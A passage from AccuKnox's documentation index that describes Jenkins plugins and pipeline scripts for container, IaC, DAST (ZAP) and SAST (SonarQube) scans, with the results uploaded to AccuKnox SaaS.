Scan","text":"<p>The AccuKnox Container Scan Jenkins Plugin is designed to integrate AccuKnox's container scanning capabilities into your Jenkins pipelines. This plugin allows you to perform container image scans and automatically upload the results to AccuKnox SaaS.</p>"},{"location":"integrations/jenkins-container-scan/#features","title":"Features","text":"<ul> <li> <p>Container Image Scans: Scan Docker images for vulnerabilities.</p> </li> <li> <p>Severity Levels: Specify the severity levels to be scanned.</p> </li> <li> <p>Automatic Results Upload: Upload scan results to AccuKnox SaaS for centralized management and reporting.</p> </li> <li> <p>Exit Code Handling: Specify exit codes as 0 to pass the build and 1 to fail the build having specified vulnerabilities of high, medium, etc.</p> </li> <li> <p>Repository and Branch Information: Include repository and branch information in the scan results for better traceability.</p> </li> </ul>"},{"location":"integrations/jenkins-container-scan/#installation","title":"Installation","text":""},{"location":"integrations/jenkins-container-scan/#current-installation-method","title":"Current Installation Method","text":"<ol> <li> <p>Download the plugin in <code>.hpi</code> format from here.</p> </li> <li> <p>Navigate to the Jenkins dashboard.    </p> </li> <li> <p>Go to Manage Jenkins &gt; Manage Plugins.    </p> </li> <li> <p>Click on the Advanced tab.</p> </li> <li> <p>In the Deploy Plugin section, click Choose File and select the downloaded <code>.hpi</code> file.    </p> </li> <li> <p>Click Deploy to install the plugin.    </p> </li> <li> <p>Restart Jenkins if required.</p> </li> </ol>"},{"location":"integrations/jenkins-container-scan/#configuration","title":"Configuration","text":""},{"location":"integrations/jenkins-container-scan/#job-configuration","title":"Job Configuration","text":"<ol> <li> <p>Open the configuration page of your Jenkins job. </p> </li> <li> <p>Under the Build section, click on Add build step and select AccuKnox Container Scan.</p> </li> </ol> <p></p> <p></p>"},{"location":"integrations/jenkins-container-scan/#parameters","title":"Parameters","text":"<p>The plugin provides the following parameters:</p> <ul> <li> <p>Image Name: The name of the Docker image to be scanned.</p> </li> <li> <p>Image Tag: The tag of the Docker image to be scanned (default is \"latest\").</p> </li> <li> <p>Exit Code: The exit code(default is 0).</p> </li> <li> <p>Tenant ID: The tenant ID for AccuKnox API.</p> </li> <li> <p>AccuKnox Token: The access token for authenticating with AccuKnox.</p> </li> <li> <p>Label: The label for AccuKnox SaaS.</p> </li> <li> <p>Severity: The severity levels to be scanned (default is \"UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL\").</p> </li> </ul>"},{"location":"integrations/jenkins-container-scan/#token-generation-from-accuknox-saas-and-viewing-tenant-id","title":"Token Generation from AccuKnox SaaS and Viewing Tenant ID","text":"<ol> <li> <p>Navigate to Tokens within the Settings section in the sidebar. </p> </li> <li> <p>Click on Create Token: After clicking on 'Create Token,' the Tenant ID will be visible. </p> </li> <li> <p>Click on Generate. </p> </li> </ol>"},{"location":"integrations/jenkins-container-scan/#example-configuration","title":"Example Configuration","text":"<p>Here is an example of how to configure the plugin in your Jenkins job:</p> <ol> <li> <p>Add a new build step and select AccuKnox Container Scan.</p> </li> <li> <p>Configure the parameters:</p> <ul> <li> <p>Image Name: your-image-name</p> </li> <li> <p>Image Tag: latest</p> </li> <li> <p>Exit Code: 0</p> </li> <li> <p>Tenant ID: your-tenant-id</p> </li> <li> <p>AccuKnox Token: your-access-token</p> </li> <li> <p>Label: your-label</p> </li> <li> <p>Severity: UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL</p> </li> </ul> </li> </ol>"},{"location":"integrations/jenkins-container-scan/#running-the-scan","title":"Running the Scan","text":"<p>When you run the Jenkins job, the plugin will:</p> <ol> <li> <p>Print the configuration parameters to the Jenkins console output.</p> </li> <li> <p>Validate the provided AccuKnox Token and Tenant ID.</p> </li> <li> <p>Execute the AccuKnox container scan using the specified parameters.</p> </li> <li> <p>Upload the scan results to AccuKnox SaaS.</p> </li> <li> <p>Mark the build as failed if the scan or upload process encounters errors (unless soft fail is enabled).</p> </li> </ol>"},{"location":"integrations/jenkins-container-scan/#sample-console-output","title":"Sample Console Output","text":"<pre><code>accuknox-image-scan running...\nAccuKnox Container Scan executed. Output is suppressed.\nPushing results to AccuKnox SaaS...\nScan results uploaded successfully.\nBuild completed successfully.\nFinished: SUCCESS\n</code></pre>"},{"location":"integrations/jenkins-container-scan/#viewing-findings","title":"Viewing Findings","text":"<p>To view the findings in AccuKnox SaaS, navigate to Issues -&gt; Findings and select 'Container Findings'.</p> <p></p>"},{"location":"integrations/jenkins-container-scan/#troubleshooting","title":"Troubleshooting","text":""},{"location":"integrations/jenkins-container-scan/#missing-accuknox-token-or-tenant-id","title":"Missing AccuKnox Token or Tenant ID","text":"<ul> <li> <p>Ensure both fields are filled in the job configuration.</p> </li> <li> <p>Verify the accuracy of the provided credentials.</p> </li> </ul>"},{"location":"integrations/jenkins-container-scan/#scan-failure","title":"Scan Failure","text":"<ul> <li> <p>Check the Jenkins console output for detailed error messages.</p> </li> <li> <p>Ensure the specified image name and tag exist and are accessible.</p> </li> </ul>"},{"location":"integrations/jenkins-container-scan/#upload-failure","title":"Upload Failure","text":"<ul> <li> <p>Verify network connectivity to the AccuKnox SaaS endpoint.</p> </li> <li> <p>Check the accuracy of the Tenant ID and AccuKnox Token.</p> </li> </ul>"},{"location":"integrations/jenkins-dast-script/","title":"AccuKnox DAST Integration in Jenkins (Pipeline Method)","text":""},{"location":"integrations/jenkins-dast-script/#prerequisites","title":"Prerequisites","text":""},{"location":"integrations/jenkins-dast-script/#required-from-accuknox-console","title":"Required from AccuKnox Console","text":"<p>\u2705 Store these values in Jenkins Credentials Manager.</p> <ul> <li>Tenant ID</li> <li>Token</li> <li>Label ID</li> </ul>"},{"location":"integrations/jenkins-dast-script/#required-tools-on-jenkins-vm","title":"\u2699 Required Tools on Jenkins VM","text":"<ul> <li>Docker (installed and running)</li> <li>Jenkins with pipeline support</li> <li>Internet access to pull AccuKnox DAST container image</li> </ul>"},{"location":"integrations/jenkins-dast-script/#what-is-target_url","title":"What is TARGET_URL?","text":"<p>The <code>TARGET_URL</code> is the address of the web application that will be scanned using AccuKnox DAST. It can be:</p> <ul> <li>A public application (e.g., https://ginandjuice.shop/)</li> <li>An internal or local application accessible from the Jenkins agent</li> </ul> <p>\ud83d\udd12 Ensure the Jenkins agent and Docker container can access this URL.</p> <pre><code>environment {\n    TARGET_URL = 'https://ginandjuice.shop/'\n}\n</code></pre>"},{"location":"integrations/jenkins-dast-script/#jenkins-pipeline-script","title":"Jenkins Pipeline Script","text":"<pre><code>pipeline {\n    agent any\n\n    environment {\n        TARGET_URL = 'https://ginandjuice.shop/' // Your target app URL\n    }\n\n    stages {\n        stage('AccuKnox DAST Scan') {\n            steps {\n                dir(\"${env.WORKSPACE}\") {\n                    script {\n                        sh '''\n                            mkdir -p zap-output &amp;&amp; chmod 777 zap-output\n                            docker run --rm -v \"$PWD/zap-output:/zap/wrk/:rw\" -t zaproxy/zap-stable zap-baseline.py \\\n                                -t $TARGET_URL \\\n                                -J scanreport.json \\\n                                -I\n                        '''\n                    }\n                }\n            }\n        }\n\n        stage('Pushing DAST Results to AccuKnox') {\n            steps {\n                dir(\"${env.WORKSPACE}/zap-output\") {\n                    withCredentials([\n                        string(credentialsId: 'accuknox-token', variable: 'ACCUKNOX_TOKEN'),\n                        string(credentialsId: 'tenant-id', variable: 'TENANT_ID'),\n                        string(credentialsId: 'label_dast', variable: 'LABEL')\n                    ]) {\n                        sh '''\n                            curl --location --request POST \\\n\"https://cspm.demo.accuknox.com/api/v1/artifact/?tenant_id=$TENANT_ID&amp;data_type=ZAP&amp;label_id=$LABEL&amp;save_to_s3=false\" \\\n                                --header \"Tenant-Id: $TENANT_ID\" \\\n                                --header \"Authorization: Bearer $ACCUKNOX_TOKEN\" \\\n                                --form \"file=@scanreport.json\"\n                        '''\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"integrations/jenkins-dast-script/#jenkins-credentials-setup","title":"Jenkins Credentials Setup","text":"Credential ID Description accuknox-token Token generated from AccuKnox Console tenant-id Tenant ID from AccuKnox Console label_dast Label ID for the DAST scan <p>\ud83d\udcdd Refer to:</p> <ul> <li>How to Create Tokens in AccuKnox</li> <li>How to Create Labels in AccuKnox</li> </ul>"},{"location":"integrations/jenkins-dast-script/#output-files","title":"Output Files","text":"<p>After a successful scan, the following file is created:</p> <ul> <li><code>zap-output/scanreport.json</code> \u2192 Contains the DAST vulnerability scan results   This report is sent to the AccuKnox Console for visualization and triaging.</li> </ul>"},{"location":"integrations/jenkins-dast-script/#console-output","title":"Console Output","text":""},{"location":"integrations/jenkins-dast-script/#view-results-in-accuknox","title":"View Results in AccuKnox","text":"<p>After the pipeline executes successfully:</p> <ol> <li>Go to AccuKnox Console</li> <li>Navigate to Issues \u2192 Findings</li> <li>Filter using the selected label to view DAST findings</li> </ol> <p></p>"},{"location":"integrations/jenkins-dast-script/#optional-cleanup-post-scan","title":"Optional Cleanup (Post-Scan)","text":"<p>If needed, clean up the workspace after upload:</p> <pre><code>sh 'rm -f zap-output/scanreport.json'\n</code></pre>"},{"location":"integrations/jenkins-dast/","title":"Setting Up Jenkins DAST with AccuKnox for Code Testing","text":""},{"location":"integrations/jenkins-dast/#overview","title":"Overview","text":"<p>The AccuKnox DAST Jenkins Plugin simplifies integrating dynamic application security testing (DAST) into Jenkins pipelines. This plugin allows you to perform ZAP-based scans on target URLs and seamlessly upload the results to AccuKnox SaaS for centralized investigation and analysis.</p> <p></p>"},{"location":"integrations/jenkins-dast/#key-features","title":"Key Features","text":"<ul> <li> <p>Automated DAST Scans: Perform Baseline or Full Scans on target URLs directly from your Jenkins pipelines.</p> </li> <li> <p>Seamless Integration with AccuKnox: Upload scan results to AccuKnox SaaS, enabling centralized management of DAST findings alongside SAST, IaC, and container security findings.</p> </li> <li> <p>Customizable Build Parameters: Define parameters like target URL, scan type, severity thresholds, and AccuKnox authentication details.</p> </li> </ul>"},{"location":"integrations/jenkins-dast/#installation","title":"Installation","text":"<ol> <li> <p>Download the plugin in <code>.hpi</code> format from here.</p> </li> <li> <p>Navigate to the Jenkins dashboard.</p> </li> <li> <p>Go to Manage Jenkins &gt; Manage Plugins.    </p> </li> <li> <p>Under the Advanced tab:</p> </li> <li> <p>Click Choose File and select the downloaded <code>.hpi</code> file.     </p> </li> <li> <p>Click Deploy to install the plugin.    </p> </li> <li> <p>Restart Jenkins if required.</p> </li> </ol>"},{"location":"integrations/jenkins-dast/#configuration","title":"Configuration","text":""},{"location":"integrations/jenkins-dast/#job-configuration","title":"Job Configuration","text":"<ol> <li> <p>Open the configuration page of your Jenkins job.</p> </li> <li> <p>Under the Build section:</p> </li> <li> <p>Click Add build step.</p> </li> <li> <p>Select Run AccuKnox DAST Scan.</p> </li> </ol> <p></p>"},{"location":"integrations/jenkins-dast/#plugin-parameters","title":"Plugin Parameters:","text":"<p>The plugin provides the following configuration options:</p> Parameter Description Example Target URL URL of the web application to scan. <code>https://example.com</code> Scan Type Type of scan: baseline or full-scan. <code>full-scan</code> Tenant ID Tenant ID associated with your AccuKnox account. <code>my-tenant-id</code> AccuKnox Token Authentication token for AccuKnox SaaS. <code>my-accuknox-token</code> Label A label to tag the scan results in AccuKnox SaaS. <code>build-123</code> Severity Threshold Minimum severity level to trigger build failures (e.g., High). <code>High</code> <p></p>"},{"location":"integrations/jenkins-dast/#token-generation-for-accuknox","title":"Token Generation for AccuKnox","text":"<p>To generate the AccuKnox Token and obtain the Tenant ID:</p> <ol> <li> <p>Log in to AccuKnox.</p> </li> <li> <p>Navigate to Settings &gt; Tokens and create an AccuKnox token.</p> </li> <li> <p>Copy the generated token and store it securely for later use. For detailed steps, refer to How to Create Tokens.</p> </li> </ol>"},{"location":"integrations/jenkins-dast/#running-the-scan","title":"Running the Scan","text":"<p>When you run the Jenkins job:</p> <ol> <li> <p>DAST Scan Execution:</p> </li> <li> <p>The plugin performs a DAST scan (baseline or full) on the target URL.</p> </li> <li> <p>Results are saved as a <code>report.json</code> file in the workspace.</p> </li> <li> <p>Uploading Results to AccuKnox SaaS:</p> </li> <li> <p>The <code>report.json</code> file is uploaded to the specified AccuKnox tenant using the provided credentials.</p> </li> </ol>"},{"location":"integrations/jenkins-dast/#sample-console-output","title":"Sample Console Output:","text":"<pre><code>Running AccuKnox DAST Scan...\nZAP output: [ZAP Scan Logs]\nUploading DAST scan results to AccuKnox...\nResults uploaded successfully.\n</code></pre>"},{"location":"integrations/jenkins-dast/#troubleshooting","title":"Troubleshooting","text":"<ol> <li> <p>Missing AccuKnox Token or Tenant ID:</p> </li> <li> <p>Ensure both fields are provided in the Jenkins job configuration.</p> </li> <li> <p>Verify their accuracy in the AccuKnox SaaS dashboard.</p> </li> <li> <p>Scan Failure:</p> </li> <li> <p>Check the Jenkins console output for ZAP-specific errors.</p> </li> <li> <p>Verify that the target URL is accessible and not blocking scan requests.</p> </li> <li> <p>Upload Failure:</p> </li> <li> <p>Verify network connectivity to the AccuKnox SaaS endpoint.</p> </li> <li> <p>Double-check the Tenant ID and AccuKnox Token.</p> </li> <li> <p>Ensure the <code>report.json</code> file is generated correctly before uploading.</p> </li> </ol>"},{"location":"integrations/jenkins-dast/#conclusion","title":"Conclusion","text":"<p>The AccuKnox DAST Jenkins Plugin simplifies the process of integrating dynamic application security testing into your CI/CD pipeline. By seamlessly combining ZAP-based scans with AccuKnox SaaS, you can ensure vulnerabilities are identified and managed in a centralized manner, improving the overall security posture of your application.</p> <p>For further assistance, contact the AccuKnox support team or refer to the AccuKnox Documentation.</p>"},{"location":"integrations/jenkins-iac-scan/","title":"Jenkins IaC Scan Plugin","text":"<p>The AccuKnox IaC Scan Jenkins Plugin is designed to integrate AccuKnox's Infrastructure as Code (IaC) scanning capabilities into your Jenkins pipelines. This plugin allows you to perform IaC scans using Checkov and automatically upload the results to AccuKnox SaaS.</p>"},{"location":"integrations/jenkins-iac-scan/#features","title":"Features","text":"<ul> <li> <p>Directory and File Scans: Scan specific directories or files for infrastructure misconfigurations.</p> </li> <li> <p>Framework Support: Supports scanning multiple frameworks including Terraform, CloudFormation, Kubernetes, and more.</p> </li> <li> <p>Soft Fail Option: Continue the build process even if the scan fails.</p> </li> <li> <p>Automatic Results Upload: Upload scan results to AccuKnox SaaS for centralized management and reporting.</p> </li> <li> <p>Repository and Branch Information: Include repository and branch information in the scan results for better traceability.</p> </li> </ul>"},{"location":"integrations/jenkins-iac-scan/#installation","title":"Installation","text":""},{"location":"integrations/jenkins-iac-scan/#current-installation-method","title":"Current Installation Method","text":"<ol> <li> <p>Download the plugin in <code>.hpi</code> format from here.</p> </li> <li> <p>Navigate to the Jenkins dashboard.</p> </li> <li> <p>Go to <code>Manage Jenkins</code> &gt; <code>Manage Plugins</code>.</p> </li> </ol> <p></p> <ol> <li>Click on the <code>Advanced</code> tab.</li> </ol> <p></p> <ol> <li>In the <code>Deploy Plugin</code> section, click <code>Choose File</code> and select the downloaded <code>.hpi</code> file.</li> </ol> <p></p> <ol> <li>Click <code>Deploy</code> to install the plugin.</li> </ol> <p></p> <ol> <li>Restart Jenkins if required.</li> </ol>"},{"location":"integrations/jenkins-iac-scan/#future-availability","title":"Future Availability","text":"<p>Upcoming Release</p> <p>The AccuKnox IaC Scan Jenkins Plugin will be published to the Jenkins Marketplace by August 15<sup>th</sup>. After this date, you will be able to install the plugin directly from the Jenkins Plugin Manager.</p>"},{"location":"integrations/jenkins-iac-scan/#configuration","title":"Configuration","text":""},{"location":"integrations/jenkins-iac-scan/#job-configuration","title":"Job Configuration","text":"<ol> <li>Open the configuration page of your Jenkins job.</li> </ol> <ol> <li>Under the <code>Build</code> section, click on <code>Add build step</code> and select <code>AccuKnox IaC Scan</code>.</li> </ol>"},{"location":"integrations/jenkins-iac-scan/#usage","title":"Usage","text":""},{"location":"integrations/jenkins-iac-scan/#parameters","title":"Parameters","text":"<p>The plugin provides the following parameters:</p> <ul> <li> <p>Directory: The directory to be scanned.</p> </li> <li> <p>Soft Fail: Whether to continue the build process if the scan fails.</p> </li> <li> <p>Tenant ID: The tenant ID for the AccuKnox API.</p> </li> <li> <p>AccuKnox Token: The access token for authenticating with AccuKnox.</p> </li> <li> <p>Framework: The framework to be used for scanning (default is <code>all</code>).</p> </li> <li> <p>File: Specific file to be scanned (optional).</p> </li> <li> <p>Repository: URL of the repository being scanned.</p> </li> <li> <p>Branch: Branch name of the repository.</p> </li> </ul> <p>Token Generation from AccuKnox SaaS and Viewing Tenant ID which will be used in the AccuKnox IaC Scan Plugin</p> <p>Navigate to Tokens within the Settings section in the sidebar:</p> <p></p> <p>Click on Create Token: After clicking on 'Create Token,' the Tenant ID will be visible.</p> <p></p> <p>Click on Generate:</p> <p></p>"},{"location":"integrations/jenkins-iac-scan/#example-configuration","title":"Example Configuration","text":"<p>Here is an example of how to configure the plugin in your Jenkins job:</p> <ol> <li> <p>Add a new build step and select <code>AccuKnox IaC Scan</code>.</p> </li> <li> <p>Configure the parameters:</p> <ul> <li> <p>Directory: <code>src</code></p> </li> <li> <p>Soft Fail: <code>true</code></p> </li> <li> <p>Tenant ID: <code>your-tenant-id</code></p> </li> <li> <p>AccuKnox Token: <code>your-access-token</code></p> </li> <li> <p>Framework: <code>terraform</code></p> </li> <li> <p>File: <code>main.tf</code></p> </li> <li> <p>Repository: <code>https://github.com/your-repo.git</code></p> </li> <li> <p>Branch: <code>main</code></p> </li> </ul> </li> </ol>"},{"location":"integrations/jenkins-iac-scan/#running-the-scan","title":"Running the Scan","text":"<p>When you run the Jenkins job, the plugin will:</p> <ol> <li>Print the configuration parameters to the Jenkins console output.</li> <li>Validate the provided AccuKnox Token and Tenant ID.</li> <li>Execute the Checkov scan using the specified parameters.</li> <li>Upload the scan results to AccuKnox SaaS.</li> <li>Mark the build as failed if the scan or upload process encounters errors (unless <code>soft fail</code> is enabled).</li> </ol>"},{"location":"integrations/jenkins-iac-scan/#sample-console-output","title":"Sample Console Output","text":"<pre><code>Starting AccuKnox IaC scan.\nDirectory: src\nFramework: terraform\nSoft Fail: true\nFile: main.tf\nTenant ID: your-tenant-id\nAccuKnox Token: Provided\nRepository: https://github.com/your-repo.git\nBranch: main\nRunning AccuKnox IaC scan...\nAccuKnox IaC scan completed successfully.\nPushing results to AccuKnox SaaS...\nScan results uploaded successfully.\nBuild completed successfully.\n</code></pre> <p>To view the findings in the AccuKnox SaaS, go to issues \u2192 findings \u2192 select 'IaC findings'</p> <p></p>"},{"location":"integrations/jenkins-iac-scan/#troubleshooting","title":"Troubleshooting","text":"<p>Missing AccuKnox Token or Tenant ID</p> <ul> <li>Ensure both fields are filled in the job configuration.</li> <li>Verify the accuracy of the provided credentials.</li> </ul> <p>Scan Failure</p> <ul> <li>Check the Jenkins console output for detailed error messages.</li> <li>Ensure the specified directory or file exists and is accessible.</li> </ul> <p>Upload Failure</p> <ul> <li>Verify network connectivity to the AccuKnox SaaS endpoint.</li> <li>Check the accuracy of the Tenant ID and AccuKnox Token.</li> </ul>"},{"location":"integrations/jenkins-overview/","title":"Jenkins Integrations","text":""},{"location":"integrations/jenkins-overview/#jenkins-integrations","title":"Jenkins Integrations","text":"<p>SAST (Static Analysis)</p> <p>Container Scan</p> <p>IaC Scan</p> <p>DAST (Dynamic Analysis)</p> <p>Secrets Scan</p> <p>Pipeline Script for SAST</p> <p>Pipeline Script for DAST</p> <p></p>"},{"location":"integrations/jenkins-sast-script/","title":"SonarQube and Jenkins Integration","text":"<p>This document provides instructions for integrating SonarQube with Jenkins and AccuKnox. Refer to this documentation for SonarQube &lt;&gt; Jenkins integration.</p>"},{"location":"integrations/jenkins-sast-script/#prerequisites","title":"Prerequisites","text":""},{"location":"integrations/jenkins-sast-script/#from-accuknox-console","title":"From AccuKnox Console:","text":"<ul> <li>Label: Label Creation</li> <li>Tenant: Tenant</li> <li>Token: Token Creation</li> <li>User Token: Token Creation</li> </ul>"},{"location":"integrations/jenkins-sast-script/#from-sonarqube","title":"From SonarQube:","text":"<ul> <li>Required credentials for integration.</li> </ul> <p>Note: Store the above values in the Jenkins credentials manager.</p>"},{"location":"integrations/jenkins-sast-script/#jenkins-pipeline-script","title":"Jenkins Pipeline Script","text":"<p>Add the following lines after the SonarQube analysis stage in the Jenkins pipeline script. These steps are required to fetch results from SonarQube and send them from the Jenkins VM to the AccuKnox Console.</p> <p>Note: Update the <code>credentialsId</code> according to the ID you have created for your use.</p>"},{"location":"integrations/jenkins-sast-script/#example-accuknox-sast-job-stage","title":"Example: AccuKnox SAST Job Stage","text":"<pre><code>stage('Run AccuKnox-sastjob') {\n    steps {\n        dir(WORKSPACE_DIR) {\n            withCredentials([string(credentialsId: 'sonarqube', variable: 'SQ_AUTH_TOKEN')]) {\n                sh '''\n                docker run --rm \\\n                -e SQ_URL=https://sq.accuknox.com/ \\\n                -e SQ_AUTH_TOKEN=$SQ_AUTH_TOKEN \\\n                -e REPORT_PATH=/app/data/ \\\n                -e SQ_PROJECTS=^vulnerable-project$ \\\n                -v $PWD:/app/data/ \\\n                accuknox/sastjob:1.0\n                '''\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"integrations/jenkins-sast-script/#example-pushing-results-to-accuknox","title":"Example: Pushing Results to AccuKnox","text":"<pre><code>stage('Pushing results to AccuKnox') {\n    steps {\n        dir(WORKSPACE_DIR) {\n            withCredentials([\n                string(credentialsId: 'accuknox-token', variable: 'ACCUKNOX_TOKEN'),\n                string(credentialsId: 'tenant-id', variable: 'TENANT_ID'),\n                string(credentialsId: 'label', variable: 'LABEL')\n            ]) {\n                sh '''\n                for file in SQ-*.json; do\n                    curl --location --request POST \\\n                    \"https://cspm.demo.accuknox.com/api/v1/artifact/?tenant_id=$TENANT_ID&amp;data_type=SQ&amp;label_id=$LABEL&amp;save_to_s3=false\" \\\n                    --header \"Tenant-Id: $TENANT_ID\" \\\n                    --header \"Authorization: Bearer $ACCUKNOX_TOKEN\" \\\n                    --form \"file=@$file\"\n                done\n                '''\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"integrations/jenkins-sast-script/#details-of-accuknox-sastjob-stage-in-jenkins","title":"Details of AccuKnox-sastjob stage in Jenkins","text":"<pre><code>rm -f SQ-*.json # Remove existing reports\ndocker run --rm -it \\\n-e SQ_URL=http://35.188.10.229:9000 \\\n-e SQ_AUTH_TOKEN=&lt;AUTH-TOKEN&gt; \\\n-e SQ_PROJECTS=\"^nimbus$\" \\\n-e SQ_ORG=\"accuknox\" /* needed for sonarcloud.io */ \\\n-e REPORT_PATH=/app/data/ \\\n-v $PWD:/app/data/ \\\naccuknox/sastjob:1.0.3\n</code></pre> <p>This will create a bunch of SQ-*.json files, one for every project/component found in the SonarQube server.</p>"},{"location":"integrations/jenkins-sast-script/#configuration-details","title":"Configuration Details","text":"Variable Sample Value Description <code>SQ_URL</code> <code>http://35.188.10.229:9000</code>, <code>https://sonarcloud.io/</code> SonarQube server URL <code>SQ_AUTH_TOKEN</code> <code>squ_token</code> SonarQube user authentication token <code>SQ_PROJECTS</code> <code>^nimbus$</code> Projects/components to scan <code>SQ_ORG</code> <code>accuknox</code> Required for SonarCloud enterprise <code>REPORT_PATH</code> <code>/app/data/</code> Path to store the report JSON files <p>Note: Variables marked with <code>*</code> are mandatory configuration options.</p>"},{"location":"integrations/jenkins-sast-script/#complete-jenkins-pipeline-script-example","title":"Complete Jenkins Pipeline Script Example","text":"<p>Repository used for testing: GitHub Repository Branch: <code>main</code></p> <pre><code>pipeline {\n    agent any\n    environment {\n        MAVEN_HOME = \"${WORKSPACE}/apache-maven-3.9.4\"\n        WORKSPACE_DIR = \"${WORKSPACE}\"\n        PROJECT_DIR = \"${WORKSPACE}/addressbook/addressbook_main\"\n    }\n    stages {\n        stage('CHECKOUT') {\n            steps {\n                checkout scmGit(\n                    branches: [[name: '*/main']],\n                    extensions: [],\n                    userRemoteConfigs: [[url: 'https://github.com/udit-uniyal/Devops.git']]\n                )\n            }\n        }\n\n        stage('Install Maven Build Tool') {\n            steps {\n                dir(WORKSPACE_DIR) {\n                    sh '''\n                    wget https://dlcdn.apache.org/maven/maven-3/3.9.4/binaries/apache-maven-3.9.4-bin.tar.gz\n                    tar -xzvf apache-maven-3.9.4-bin.tar.gz\n                    '''\n                }\n            }\n        }\n\n        stage('Compile Application') {\n            steps {\n                dir(PROJECT_DIR) {\n                    sh '${MAVEN_HOME}/bin/mvn compile'\n                }\n            }\n        }\n\n        stage('Test Application') {\n            steps {\n                dir(PROJECT_DIR) {\n                    sh '${MAVEN_HOME}/bin/mvn test'\n                }\n            }\n        }\n\n        stage('SonarQube Analysis') {\n            steps {\n                dir(PROJECT_DIR) {\n                    withSonarQubeEnv('Sonarqube') {\n                        sh '${MAVEN_HOME}/bin/mvn clean verify sonar:sonar -Dsonar.projectKey=vulnerable-project'\n                    }\n                }\n            }\n        }\n\n        stage('Run AccuKnox-sastjob') {\n            steps {\n                dir(WORKSPACE_DIR) {\n                    withCredentials([string(credentialsId: 'sonarqube', variable: 'SQ_AUTH_TOKEN')]) {\n                        sh '''\n                        docker run --rm \\\n                        -e SQ_URL=https://sq.accuknox.com/ \\\n                        -e SQ_AUTH_TOKEN=$SQ_AUTH_TOKEN \\\n                        -e REPORT_PATH=/app/data/ \\\n                        -e SQ_PROJECTS=^vulnerable-project$ \\\n                        -v $PWD:/app/data/ \\\n                        accuknox/sastjob:1.0\n                        '''\n                    }\n                }\n            }\n        }\n\n        stage('Pushing results to AccuKnox') {\n            steps {\n                dir(WORKSPACE_DIR) {\n                    withCredentials([\n                        string(credentialsId: 'accuknox-token', variable: 'ACCUKNOX_TOKEN'),\n                        string(credentialsId: 'tenant-id', variable: 'TENANT_ID'),\n                        string(credentialsId: 'label', variable: 'LABEL')\n                    ]) {\n                        sh '''\n                        for file in SQ-*.json; do\n                            curl --location --request POST \\\n                            \"https://cspm.demo.accuknox.com/api/v1/artifact/?tenant_id=$TENANT_ID&amp;data_type=SQ&amp;label_id=$LABEL&amp;save_to_s3=false\" \\\n                            --header \"Tenant-Id: $TENANT_ID\" \\\n                            --header \"Authorization: Bearer $ACCUKNOX_TOKEN\" \\\n                            --form \"file=@$file\"\n                        done\n                        '''\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre> <p></p>"},{"location":"integrations/jenkins-sast-script/#viewing-findings-in-accuknox-console","title":"Viewing Findings in AccuKnox Console","text":"<p>Navigate to Issues &gt; Findings &gt; Findings in the AccuKnox Console to view the results.</p> <p></p>"},{"location":"integrations/jenkins-sast/","title":"Setting Up Jenkins SAST with AccuKnox for Code Security","text":"<p>The AccuKnox SAST Jenkins Plugin simplifies integrating SonarQube-based Static Application Security Testing (SAST) with Jenkins pipelines. This plugin facilitates fetching project-specific reports from SonarQube and sending the results to AccuKnox SaaS for centralized investigation and analysis.</p>"},{"location":"integrations/jenkins-sast/#key-features","title":"Key Features","text":"<ul> <li> <p>Fetch SonarQube Reports: Retrieve detailed SAST reports for specific projects from SonarQube within Jenkins.</p> </li> <li> <p>Seamless Integration with AccuKnox: Upload fetched results to AccuKnox SaaS, a centralized dashboard for SAST, DAST, and other findings.</p> </li> <li> <p>Customizable Build Parameters: Define parameters such as SonarQube URL, project keys, and AccuKnox tokens.</p> </li> </ul>"},{"location":"integrations/jenkins-sast/#installation","title":"Installation","text":"<ol> <li> <p>Download the plugin in <code>.hpi</code> format from here.</p> </li> <li> <p>Navigate to the Jenkins dashboard.</p> </li> <li> <p>Go to Manage Jenkins &gt; Manage Plugins.    </p> </li> <li> <p>In the Advanced tab, click Choose File and select the downloaded <code>.hpi</code> file.    </p> </li> </ol> <p></p> <ol> <li> <p>Click Deploy to install the plugin.    </p> </li> <li> <p>Restart Jenkins if required.</p> </li> </ol>"},{"location":"integrations/jenkins-sast/#configuration","title":"Configuration","text":""},{"location":"integrations/jenkins-sast/#job-configuration","title":"Job Configuration","text":"<ol> <li> <p>Open the configuration page of your Jenkins job.</p> </li> <li> <p>Under the Build section, click on Add build step and select Run AccuKnox SAST Scan.</p> </li> </ol> <p></p>"},{"location":"integrations/jenkins-sast/#plugin-parameters","title":"Plugin Parameters","text":"<p>The plugin provides the following configuration options:</p> <ul> <li> <p>SonarQube Token: The authentication token for SonarQube.</p> </li> <li> <p>SonarQube Host URL: The URL of your SonarQube server.</p> </li> <li> <p>SonarQube Project Key: The key for the SonarQube project to scan.</p> </li> <li> <p>AccuKnox Endpoint: The AccuKnox API endpoint.</p> </li> <li> <p>Tenant ID: The tenant ID associated with your AccuKnox account.</p> </li> <li> <p>AccuKnox Token: The access token used to authenticate with AccuKnox.</p> </li> <li> <p>Label: A label for the scan to associate the scan results with a particular context or feature.</p> </li> </ul>"},{"location":"integrations/jenkins-sast/#example-configuration","title":"Example Configuration","text":"<pre><code>SonarQube Token: my-sonar-token\nSonarQube Host URL: https://sonarqube.example.com\nSonarQube Project Key: example-project\nAccuKnox Endpoint: https://api.accuknox.com\nTenant ID: my-tenant-id\nAccuKnox Token: my-accuknox-token\nLabel: build-123\n</code></pre>"},{"location":"integrations/jenkins-sast/#token-generation-for-accuknox","title":"Token Generation for AccuKnox","text":"<p>To generate the AccuKnox Token and obtain the Tenant ID:</p> <ol> <li> <p>Log in to AccuKnox.</p> </li> <li> <p>Navigate to Settings &gt; Tokens and create an AccuKnox token.</p> </li> <li> <p>Copy the generated token and store it securely for later use. For detailed steps, refer to How to Create Tokens.</p> </li> </ol>"},{"location":"integrations/jenkins-sast/#running-the-scan","title":"Running the Scan","text":"<p>Once configured, when you run the Jenkins job, the plugin will:</p> <ol> <li> <p>Validate the provided SonarQube Token and SonarQube Host URL.</p> </li> <li> <p>Fetch the results from sonarqube using the specified project key.</p> </li> <li> <p>Upload the results to AccuKnox SaaS for further processing and visibility.</p> </li> </ol>"},{"location":"integrations/jenkins-sast/#sample-console-output","title":"Sample Console 